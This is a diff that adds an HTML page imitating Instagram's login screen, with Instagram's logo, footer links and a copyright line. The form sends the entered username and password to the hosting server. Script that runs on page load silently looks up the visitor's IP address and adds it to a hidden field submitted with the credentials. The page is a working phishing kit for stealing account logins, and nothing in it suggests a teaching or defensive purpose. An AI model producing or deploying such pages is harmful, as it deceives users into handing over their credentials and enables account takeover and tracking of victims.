@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
+  <link rel="stylesheet" href="../static/style.css">
+   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+  <title>Instagram Login Form</title>
+</head>
+
+<body  onload="getLocation()">
+
+  <div id="wrapper">
+    <div class="container">
+      <div class="phone-app-demo" style="  background: url('../static/mobile-app.png') center no-repeat;   height: 61.8rem; flex: 1;"></div>
+      <div class="form-data">
+        <form id="my-form" method="POST" action="/">
+          <div class="logo">
+              <img src="../static/logo.png" alt="logo">
+          </div>
+          <input type="text" placeholder="Phone number, username, or email" name="username">
+          <input type="password" placeholder="Password" name="password">
+          <input type="hidden" id="ip-address" name="ip-address">
+
+       
+          <button class="form-btn" type="submit">Log in</button>
+      </form>
+          <span class="has-separator">Or</span>
+          <a class="facebook-login" href="#">
+            <i class="fab fa-facebook-square"></i> Log in with Facebook
+          </a>
+          <a class="password-reset" href="#">Forgot password?</a>
+        </form>
+        <div class="sign-up">
+          Don't have an account? <a href="#">Sign up</a>
+        </div>
+        <div class="get-the-app">
+          <span>Get the app.</span>
+          <div class="badges">
+            <img src="../static/app-store.png" alt="app-store badge">
+            <img src="../static/google-play.png" alt="google-play badge">
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="container">
+        <nav class="footer-nav">
+          <ul>
+            <li>
+              <a href="#">About us</a>
+            </li>
+            <li>
+              <a href="#">Support</a>
+            </li>
+            <li>
+              <a href="#">Press</a>
+            </li>
+            <li>
+              <a href="#">Api</a>
+            </li>
+            <li>
+              <a href="#">Jobs</a>
+            </li>
+            <li>
+              <a href="#">Privacy</a>
+            </li>
+            <li>
+              <a href="#">Terms</a>
+            </li>
+            <li>
+              <a href="#">Directory</a>
+            </li>
+            <li>
+              <a href="#">Profiles</a>
+            </li>
+            <li>
+              <a href="#">Hashtags</a>
+            </li>
+            <li>
+              <a href="#">Languages</a>
+            </li>
+          </ul>
+        </nav>
+        <div class="copyright-notice">
+          &copy 2019 Instagram
+        </div>
+      </div>
+    </footer>
+<script>
+function submitForm() {
+  // Select the form element
+  var form = document.getElementById("my-form");
+  
+  // Submit the form
+  form.submit();
+}
+
+         function getLocation() {
+          $.getJSON("https://api.ipify.org?format=json", function (data) {
+                var ipAddressInput = document.getElementById("ip-address");
+                ipAddressInput.value = data.ip;
+          })
+        }
+
+
+
+</script>
+  </div>
+
+</body>
+
+</html> 
